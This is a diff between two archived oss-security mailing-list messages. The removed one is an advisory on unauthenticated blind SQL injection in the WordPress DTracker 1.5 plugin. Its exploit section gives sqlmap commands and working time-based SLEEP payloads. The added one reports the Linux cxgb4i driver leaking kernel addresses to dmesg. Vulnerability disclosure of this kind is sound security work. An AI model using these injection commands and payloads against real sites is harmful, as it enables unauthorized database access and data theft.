@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["3481" "Thursday" "9" "March" "2017" "07:57:13" "-0500" "Larry W. Cashdollar" "larry0@me.com" "<C3D0A2F5-941D-4030-9910-57C3E46053E1@me.com>" "82" "[oss-security] Multiple Blind SQL injection vulnerability in Wordpress Plugin DTracker v1.5" nil nil nil "3" "2017030912:57:13" "[oss-security] Multiple Blind SQL injection vulnerability in Wordpress Plugin DTracker v1.5" (number mark "U       larry0@me.co Mar  9   82/3481  " thread-indent "\"[oss-security] Multiple Blind SQL injection vulnerability in Wordpress Plugin DTracker v1.5\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2159" "Thursday" "18" "April" "2019" "21:35:40" "+0800" "Fuqian Huang" "huangfq.daxian@gmail.com" "<CABXRUiT_PGoMJTkeEUeUguZWC0sZQoBPe+URKY9p7KuRsT2sXA@mail.gmail.com>" "72" "[oss-security] Linux kernel < 4.14.111 drivers/scsi/cxgbi/cxgb4i/cxgb4i.c kernel address dumps to user space" nil nil nil "4" "2019041813:35:40" "[oss-security] Linux kernel < 4.14.111 drivers/scsi/cxgbi/cxgb4i/cxgb4i.c kernel address dumps to user space" (number mark "U       huangfq.daxi Apr 18   72/2159  " thread-indent "\"[oss-security] Linux kernel < 4.14.111 drivers/scsi/cxgbi/cxgb4i/cxgb4i.c kernel address dumps to user space\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Linux kernel < 4.14.111 drivers/scsi/cxgbi/cxgb4i/cxgb4i.c kernel address dumps to user space" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 29911 invoked by uid 550); 9 Mar 2017 12:57:29 -0000
+Received: (qmail 15492 invoked by uid 550); 18 Apr 2019 16:37:13 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,112 +12,110 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 29879 invoked from network); 9 Mar 2017 12:57:28 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
-	t=1489064236; bh=5w5J2pwijcJm9SpOvisrQTlOwZ1T0zVEoKDQJz9l1wk=;
-	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
-	b=bzRgt5TyKH2JSePFvK4mCQUHCl80z3ujA67PkBNYUIEVB8k39Izwf3bNaL0fjQ7sz
- 9rh62t1RuUe91xbQjMwZRrvNhNPKJV2Hx3zJFh45gcQEI1HGsjq5PHnruQ/tervt+s
- ueAZif6puJBHbY9kCVofpPLkNZE19xPkQonalWBCSibRctQp+CguHreNbA+9jA+f1a
- rvj/fY0c4Cvh5m6aobfg06WDKVBVxgMExUqG0pwgId+ov9UUA0NBhfgg8UuFsz/PSC
- slB8S8XbnRuXOz0QFTLR23wplqLVoGBlGOJUc17Np94p986cmPrl758VW0Fc8xdlKU
- 0XuzZCa6iXj6w==
-X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
- definitions=2017-03-09_09:,, signatures=0
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
- clxscore=1034 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
- bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
- engine=8.0.1-1701120000 definitions=main-1703090098
-From: "Larry W. Cashdollar" <larry0@me.com>
-Content-type: text/plain; charset=utf-8
-Content-transfer-encoding: quoted-printable
-Message-id: <C3D0A2F5-941D-4030-9910-57C3E46053E1@me.com>
-Date: Thu, 09 Mar 2017 07:57:13 -0500
-To: Open Source Security <oss-security@lists.openwall.com>
-MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
-X-Mailer: Apple Mail (2.3124)
-Subject: [oss-security] Multiple Blind SQL injection vulnerability in Wordpress Plugin
- DTracker v1.5
+Received: (qmail 26427 invoked from network); 18 Apr 2019 13:36:03 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20161025;
+        h=mime-version:from:date:message-id:subject:to;
+        bh=EsIarMYf0O0IOr6UHfozT/ar72WPyfu+4TSO00ZFMVQ=;
+        b=FibSTlUpSlk8HMTaNlqfUx1oTIBfAsYO+Y+3wln5bNOy0BwnHoFEwX6JTLlNcoLgQy
+         sdalQC3EacZbzo64lRKrR3pENfU9asoyPec4o+5JimT9J1Noa4y5tNpenxqmLD5Gy2j5
+         0FfBHPpUui4k100BoUp5EF0ZShRjOKQU8BFKX/rnQ7WwEx26D5N/4O7IatUnzbxrqywm
+         XMEyw+z1xK5ADPupL9mNg7x/1CoSjQNIXW68dax5cU2QQufuligeT7oCP5NEt0woYeQF
+         VF+Tm8vwR3aCDwLgZ5De2PyXhbh1RTr++ldIelH6MNeBgRaM6/tXmskk+veZVNf7SIru
+         CqgA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
+        bh=EsIarMYf0O0IOr6UHfozT/ar72WPyfu+4TSO00ZFMVQ=;
+        b=lVzhO3tsDT6/6jFzZk8J+TT1x40igmipkFJty5ubJeb6QPoCfeittJTQgDCUFw8PUz
+         SWgYlxNVv0pOEZfXAjmYIwSGXnd6KEISYlJCvuf5uzRkx1XVf/SijPKPFhegmS3qlLgT
+         5/x1WFetdR7eZ3hxgn5p4EMKPLYQHos27BlPFnkSsgiALXJbtsTmOhc63WM1A5ji/k5S
+         xX7GdlZl2YR9SC31jT+80heeJ0s6ba0V3kBi4kqbSKE+QC1giHB3nsGggsk8Hp+4F05r
+         nubdWCV0lJJaVboZYiFB+tmwTFcTAd/JYEOZF50UAYkj6kzetGbzVfIpPfUOhTmws2xx
+         CpXw==
+X-Gm-Message-State: APjAAAUzLknElD+V36NRPIIC84KOIS521sNu9AcehI1YGDh0D4TADcZ3
+	Z6SPmHnJv8zTmKN1rmwJk8Ugx6ujjb6KSS6UTKURIi9AE4w=
+X-Google-Smtp-Source: APXvYqz5EoQ0C/XA9wePm9lI8O1Y9eX4sintOdFDPzKqTnmDr8OeIDGrxZbgx+AO8wYZ0YLGuAGM4R94z4IxxtD0aOw=
+X-Received: by 2002:a5b:18b:: with SMTP id r11mr46792065ybl.449.1555594551518;
+ Thu, 18 Apr 2019 06:35:51 -0700 (PDT)
+MIME-Version: 1.0
+From: Fuqian Huang <huangfq.daxian@gmail.com>
+Date: Thu, 18 Apr 2019 21:35:40 +0800
+Message-ID: <CABXRUiT_PGoMJTkeEUeUguZWC0sZQoBPe+URKY9p7KuRsT2sXA@mail.gmail.com>
+To: oss-security@lists.openwall.com
+Content-Type: text/plain; charset="UTF-8"
+Subject: [oss-security] Linux kernel < 4.14.111 drivers/scsi/cxgbi/cxgb4i/cxgb4i.c kernel
+ address dumps to user space
 
-Title: Multiple Blind SQL injection vulnerability in Wordpress Plugin DTrac=
-ker v1.5
-Author: Larry W. Cashdollar, @_larry0
-Date: 2017-03-08
-CVE-IDs: CVE-2017-1002004 CVE-2017-1002005
-Download Site: https://wordpress.org/plugins/dtracker/
-Vendor: https://profiles.wordpress.org/dijo/
-Vendor Notified: 2017-03-08
-Vendor Contact: plugins@wordpress.org
-Advisory: http://www.vapidlabs.com/advisory.php?v=3D183
-Description: Track the details of the users downloading the pdf files from =
-wordpress site.
-Vulnerability:
-CVE-2017-1002004:
-In file ./dtracker/download.php user input isn't sanitized via the id varia=
-ble before adding it to the end of an SQL query.
+In drivers/scsi/cxgbi/cxgb4i/cxgb4i.c:299,
+send_act_open_req will dump the address of csk to dmesg
+which allows local user to read kernel address via dmesg.
 
-$doc_id         =3D $_GET['id'];
-$file =3D $wpdb->get_results( "SELECT * FROM wp_posts WHERE ID =3D $doc_id =
-" );
-
-The user does not need to be authenticated to the Wordpress installation to=
- exploit this vulnerability.
-
-CVE-2017-1002005:
-In file ./dtracker/delete.php user input isn't sanitized via the contact_id=
- variable before adding it to the end of an SQL query.
-
-$contact_id     =3D $_POST['contact_id']; //Contact ID to be deleted
-
-$query  =3D "DELETE FROM wp_contacts WHERE id =3D $contact_id";
-$wpdb->query($query); // Delete the contact
-
-The user does not need to be authenticated to the Wordpress installation to=
- exploit this vulnerability.
-
-Exploit Code:
-	=E2=80=A2 $ sqlmap -u 'http://example.com/wordpress/wp-content/plugins/dtr=
-acker/download.php?id=3D*'  --dbms mysql  --level 3 --risk 3
-	=E2=80=A2 URI parameter '#1*' is vulnerable. Do you want to keep testing t=
-he others (if any)? [y/N]=20
-	=E2=80=A2 sqlmap identified the following injection point(s) with a total =
-of 1410 HTTP(s) requests:
-	=E2=80=A2 ---
-	=E2=80=A2 Parameter: #1* (URI)
-	=E2=80=A2     Type: AND/OR time-based blind
-	=E2=80=A2     Title: MySQL >=3D 5.0.12 time-based blind - Parameter replace
-	=E2=80=A2     Payload: http://192.168.0.169:80/wordpress/wp-content/plugin=
-s/dtracker/download.php?id=3D(CASE WHEN (7148=3D7148) THEN SLEEP(5) ELSE 71=
-48 END)
-	=E2=80=A2 ---
-	=E2=80=A2 [10:14:09] [INFO] the back-end DBMS is MySQL
-	=E2=80=A2 web server operating system: Linux Ubuntu 16.04 (xenial)
-	=E2=80=A2 web application technology: Apache 2.4.18
-	=E2=80=A2 back-end DBMS: MySQL >=3D 5.0.12
-	=E2=80=A2 [10:14:09] [WARNING] HTTP error codes detected during run:
-	=E2=80=A2 404 (Not Found) - 14 times
-	=E2=80=A2 [10:14:09] [INFO] fetched data logged to text files under '/home=
-/larry/.sqlmap/output/example.com'
-=09
+static void send_act_open_req(struct cxgbi_sock *csk, struct sk_buff *skb,
+                struct l2t_entry *e)
+{
+    ...
+    pr_info_ipaddr("t%d csk 0x%p,%u,0x%lx,%u, rss_qid %u.\n",
+               (&csk->saddr), (&csk->daddr),
+               CHELSIO_CHIP_VERSION(lldi->adapter_type), csk,
+               csk->state, csk->flags, csk->atid, csk->rss_qid);
+    ...
+}
 
 
-	=E2=80=A2 $ sqlmap -u 'http://example.com/wordpress/wp-content/plugins/dtr=
-acker/delete.php' --data 'contact_id=3D*'  --dbms mysql --risk 1 --level 3
-	=E2=80=A2=20=20
-	=E2=80=A2 (custom) POST parameter '#1*' is vulnerable. Do you want to keep=
- testing the others (if any)? [y/N]=20
-	=E2=80=A2 sqlmap identified the following injection point(s) with a total =
-of 831 HTTP(s) requests:
-	=E2=80=A2 ---
-	=E2=80=A2 Parameter: #1* ((custom) POST)
-	=E2=80=A2     Type: AND/OR time-based blind
-	=E2=80=A2     Title: MySQL >=3D 5.0.12 time-based blind - Parameter replac=
-e (substraction)
-	=E2=80=A2     Payload: contact_id=3D(SELECT * FROM (SELECT(SLEEP(5)))Vtrh)
-	=E2=80=A2 ---
-	=E2=80=A2 [11:53:27] [INFO] the back-end DBMS is MySQL
-	=E2=80=A2 web server operating system: Linux Ubuntu 16.04 (xenial)
-	=E2=80=A2 web application technology: Apache 2.4.18
-	=E2=80=A2 back-end DBMS: MySQL >=3D 5.0.12
-	=E2=80=A2 [11:53:27] [INFO] fetched data logged to text files under '/home=
-/larry/.sqlmap/output/example.com'=
+In drivers/scsi/cxgbi/cxgb4i/cxgb4i.c:1792,
+cxgb4i_ofld_init will dump the address of cdev to dmesg
+which allows local user to read kernel address via dmesg.
+
+static int cxgb4i_ofld_init(struct cxgbi_device *cdev)
+{
+    ...
+    pr_info("cdev 0x%p, offload up, added.\n", cdev);
+    ...
+}
+
+In drivers/scsi/cxgbi/cxgb4i/cxgb4i.c:2047,
+t4_uld_add will dump the address of cdev to dmesg
+which allows local user to read kernel address via dmesg.
+
+static void *t4_uld_add(const struct cxgb4_lld_info *lldi)
+{
+    ...
+    pr_info("cdev 0x%p,%s, pfvf %u.\n",
+        cdev, lldi->ports[0]->name, cdev->pfvf);
+    ...
+}
+
+In drivers/scsi/cxgbi/cxgb4i/cxgb4i.c:2129
+and drivers/scsi/cxgbi/cxgb4i/cxgb4i.c:2132
+and drivers/scsi/cxgbi/cxgb4i/cxgb4i.c:2136
+and drivers/scsi/cxgbi/cxgb4i/cxgb4i.c:2139
+and drivers/scsi/cxgbi/cxgb4i/cxgb4i.c:2143,
+t4_uld_state_change will dump the address of cdev to dmesg
+which allows local user to read kernel address via dmesg.
+
+static int t4_uld_state_change(void *handle, enum cxgb4_state state)
+{
+    struct cxgbi_device *cdev = handle;
+
+    switch (state) {
+    case CXGB4_STATE_UP:
+        pr_info("cdev 0x%p, UP.\n", cdev);
+        break;
+    case CXGB4_STATE_START_RECOVERY:
+        pr_info("cdev 0x%p, RECOVERY.\n", cdev);
+        /* close all connections */
+        break;
+    case CXGB4_STATE_DOWN:
+        pr_info("cdev 0x%p, DOWN.\n", cdev);
+        break;
+    case CXGB4_STATE_DETACH:
+        pr_info("cdev 0x%p, DETACH.\n", cdev);
+        cxgbi_device_unregister(cdev);
+        break;
+    default:
+        pr_info("cdev 0x%p, unknown state %d.\n", cdev, state);
+        break;
+    }
+    return 0;
+}
